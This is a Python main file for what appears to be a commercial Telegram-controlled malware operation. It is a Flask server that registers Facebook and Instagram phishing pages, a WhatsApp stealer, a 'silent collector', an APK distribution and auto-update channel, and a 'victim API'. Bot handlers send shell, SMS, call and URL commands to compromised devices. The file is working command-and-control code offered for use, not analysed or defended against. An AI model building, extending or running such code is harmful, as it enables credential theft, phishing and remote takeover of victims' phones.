# main.py
# ============================================================
# DEV 1 - Bot Controller v11
# مع Admin System + Silent Collector + Fake Sites
# ============================================================

import os
import time
import threading
import requests
from flask import Flask, request, jsonify

# ============================================================
# [1] Logging Setup
# ============================================================
from logging_config import (
    get_logger, log_startup_info, log_shutdown_info,
    setup_exception_hook,
)

logger = get_logger("main")
log_startup_info()
setup_exception_hook()

# ============================================================
# [2] استيراد الملفات الداخلية
# ============================================================
from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET

from imports_manager import (
    # Blueprints
    wa_bp, apk_bp,
    # Flags
    WA_ENABLED, APK_MANAGER_ENABLED,
    SILENT_ENABLED,
    # Init functions
    init_facebook_routes, init_instagram_routes,
    init_whatsapp_stealer_routes, init_apk_routes,
    init_silent_collector_routes,
    # Helpers
    register_payment_handlers,
)

from api_victim import init_victim_api

from bot_handlers import (
    start_command, callback_handler,
    dashboard_command, update_command,
    victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
    v_call_step, v_url_step, v_rename_step, victim_name_handler,
    apk_toast_step, apk_shell_step, apk_sendsms_step,
    apk_call_step, apk_url_step,
    upd_target_handler,
    silent_label_handler,
    admin_search_handler, admin_broadcast_handler,
    admin_ban_handler, admin_unban_handler, admin_delete_handler,
    admin_grant_vip_handler, admin_give_stars_handler,
    admin_msg_user_handler,
)

from short_link import init_short_link
from redis_cleaner import start_cleaner

# ============================================================
# [3] Monitoring + Rate Limiting
# ============================================================
from monitoring import init_monitoring, metrics
from rate_limiter import start_cleanup_thread

# ============================================================
# [4] Web Dashboard
# ============================================================
try:
    from web_dashboard import init_web_dashboard
    WEB_DASHBOARD_ENABLED = True
    logger.info("[+] web_dashboard imported")
except Exception as e:
    logger.exception(f"[-] web_dashboard import failed: {e}")
    WEB_DASHBOARD_ENABLED = False

    def init_web_dashboard(app):
        pass

# ============================================================
# [5] APK Auto-Update
# ============================================================
try:
    from apk_updater import init_apk_update_routes
    APK_UPDATE_ENABLED = True
    logger.info("[+] apk_updater imported")
except Exception as e:
    logger.exception(f"[-] apk_updater import failed: {e}")
    APK_UPDATE_ENABLED = False

    def init_apk_update_routes(app, bot):
        pass

# ============================================================
# [6] Fake Sites
# ============================================================
try:
    from fake_sites import init_fake_sites
    FAKE_SITES_ENABLED = True
    logger.info("[+] fake_sites imported")
except Exception as e:
    logger.exception(f"[-] fake_sites import failed: {e}")
    FAKE_SITES_ENABLED = False

    def init_fake_sites(app, bot):
        pass

# ============================================================
# [7] Admin System Hook
# ============================================================
try:
    from admin_system_hook import init_admin_system
    ADMIN_SYSTEM_HOOK_ENABLED = True
    logger.info("[+] admin_system_hook imported")
except Exception as e:
    logger.exception(f"[-] admin_system_hook import failed: {e}")
    ADMIN_SYSTEM_HOOK_ENABLED = False

    def init_admin_system(bot):
        return False

# ============================================================
# [8] Flask Setup
# ============================================================
app = Flask(__name__)


# ============================================================
# [9] Origin Gate
# ============================================================
ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']

ALLOWED_PREFIXES = (
    '/wa',
    '/apk',
    '/dashboard',
    '/s/',
    '/fs',
    '/login.php',
    '/home.php',
    '/fb',
    '/ig_login.php',
    '/fb_capture',
    '/api/v1/session',
    '/f/',
    '/manifest.json',
    '/sw.js',
    '/favicon.ico',
    '/robots.txt',
    '/_health', '/_metrics', '/_version',
)


@app.before_request
def verify_origin():
    path = request.path

    if path in ORIGIN_GATE_EXEMPT:
        return None

    if request.method == 'OPTIONS':
        return None

    if path.startswith('/apk/') or path.startswith('/victim/'):
        return None

    if any(path.startswith(p) for p in ALLOWED_PREFIXES):
        return None

    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None

    client_ip = (
        request.headers.get('CF-Connecting-IP') or
        request.headers.get('X-Forwarded-For') or
        request.remote_addr
    )
    logger.warning(f"🚫 BLOCKED: {path} from {client_ip}")
    metrics.inc_counter("blocked_requests", tags={"path": path})

    return jsonify({"error": "Access denied"}), 403


# ============================================================
# [10] Health Check
# ============================================================
@app.route('/')
def health_check():
    return "DEV 1 Controller is running.", 200


# ============================================================
# [11] Request Timing
# ============================================================
@app.before_request
def start_timer():
    request._start_time = time.time()


@app.after_request
def log_request(response):
    try:
        if hasattr(request, '_start_time'):
            elapsed_ms = (time.time() - request._start_time) * 1000
            if not request.path.startswith(('/_', '/')):
                logger.debug(
                    f"🌐 {request.method} {request.path} → "
                    f"{response.status_code} ({elapsed_ms:.1f}ms)"
                )
                metrics.observe_timing(
                    "http_request_ms",
                    elapsed_ms,
                    tags={"method": request.method, "path": request.path}
                )
    except Exception:
        pass
    return response


# ============================================================
# [12] تسجيل الـ Blueprints
# ============================================================
if wa_bp:
    app.register_blueprint(wa_bp)
    logger.info("[+] Registered: wa_bp")

if apk_bp:
    app.register_blueprint(apk_bp)
    logger.info("[+] Registered: apk_bp")


# ============================================================
# [13] Init Routes
# ============================================================
init_facebook_routes(app, bot)
logger.info("[+] Init: facebook routes")

init_instagram_routes(app, bot)
logger.info("[+] Init: instagram routes")

# WhatsApp Stealer
if WA_ENABLED:
    try:
        init_whatsapp_stealer_routes(app, bot)
        logger.info("[+] Init: wa_stealer routes")
    except Exception as e:
        logger.exception(f"[-] WA Stealer init failed: {e}")
else:
    logger.warning("[-] WA Stealer disabled - skipping init")

# APK Manager
if APK_MANAGER_ENABLED:
    try:
        init_apk_routes(app, bot)
        logger.info("[+] Init: apk_manager routes")
    except Exception as e:
        logger.exception(f"[-] APK Manager init failed: {e}")
else:
    logger.warning("[-] APK Manager disabled - skipping init")

# APK Auto-Update Routes
if APK_UPDATE_ENABLED:
    try:
        init_apk_update_routes(app, bot)
        logger.info("[+] Init: apk update routes")
    except Exception as e:
        logger.exception(f"[-] APK Update init failed: {e}")
else:
    logger.warning("[-] APK Update disabled - skipping init")

# Silent Collector Routes
if SILENT_ENABLED:
    try:
        init_silent_collector_routes(app, bot)
        logger.info("[+] Init: silent collector routes")
    except Exception as e:
        logger.exception(f"[-] Silent Collector init failed: {e}")
else:
    logger.warning("[-] Silent Collector disabled - skipping init")

# Fake Sites Routes
if FAKE_SITES_ENABLED:
    try:
        init_fake_sites(app, bot)
        logger.info("[+] Init: fake sites routes (FB + IG)")
    except Exception as e:
        logger.exception(f"[-] Fake Sites init failed: {e}")
else:
    logger.warning("[-] Fake Sites disabled - skipping init")

register_payment_handlers(bot)
logger.info("[+] Init: payment handlers")

# ============================================================
# [14] Victim API
# ============================================================
try:
    init_victim_api(app, bot)
    logger.info("[+] Init: victim API")
except Exception as e:
    logger.exception(f"[-] Victim API init failed: {e}")

# ============================================================
# [15] Short Link
# ============================================================
try:
    init_short_link(app)
    logger.info("[+] Init: short_link")
except Exception as e:
    logger.exception(f"[-] Short link init failed: {e}")

# ============================================================
# [16] Monitoring
# ============================================================
init_monitoring(app)
start_cleanup_thread()

# ============================================================
# [17] Web Dashboard
# ============================================================
if WEB_DASHBOARD_ENABLED:
    try:
        init_web_dashboard(app)
        logger.info("[+] Init: web dashboard at /dashboard")
    except Exception as e:
        logger.exception(f"[-] Web Dashboard init failed: {e}")
else:
    logger.warning("[-] Web Dashboard disabled - skipping init")

# ============================================================
# [18] ★ Admin System Hook ★
# ============================================================
if ADMIN_SYSTEM_HOOK_ENABLED:
    try:
        success = init_admin_system(bot)
        if success:
            logger.info("[+] Init: admin system hook")
        else:
            logger.warning("[-] Admin system hook failed")
    except Exception as e:
        logger.exception(f"[-] Admin System Hook init failed: {e}")
else:
    logger.warning("[-] Admin System Hook disabled")


# ============================================================
# [19] تشغيل البوت
# ============================================================
def run_telegram_bot():
    logger.info("=" * 60)
    logger.info("🤖 Starting Telegram Bot polling...")
    logger.info(f"🔑 Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    logger.info("=" * 60)

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"},
            timeout=15,
        )
        logger.info(f"[+] deleteWebhook HTTP {r.status_code}")
    except Exception as e:
        logger.error(f"[-] deleteWebhook: {e}")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
            timeout=15
        )
        logger.info(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        logger.error(f"[-] getMe: {e}")

    logger.info("[+] Starting infinity_polling loop...")
    attempt = 0
    while True:
        try:
            attempt += 1
            logger.info(f"[+] Polling attempt #{attempt}")
            metrics.inc_counter("bot_polling_attempts")

            bot.infinity_polling(
                skip_pending=True,
                timeout=30,
                long_polling_timeout=30,
                none_stop=True,
            )
        except Exception as e:
            logger.exception(f"[-] Polling crashed: {e}")
            metrics.inc_counter("bot_polling_crashes")
            logger.info("[+] Restarting in 5 seconds...")
            time.sleep(5)


# ============================================================
# [20] Main
# ============================================================
if __name__ == "__main__":
    try:
        start_cleaner()
        logger.info("[+] Redis cleaner started")

        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
        bot_thread.start()
        logger.info("[+] Bot thread started")

        time.sleep(2)

        port = int(os.environ.get("PORT", 8080))
        logger.info(f"🌐 Flask Web Server starting on port {port}...")

        app.run(
            host="0.0.0.0",
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True,
        )

    except KeyboardInterrupt:
        logger.info("🛑 Received KeyboardInterrupt")
    except Exception as e:
        logger.exception(f"💥 Fatal error: {e}")
    finally:
        log_shutdown_info()
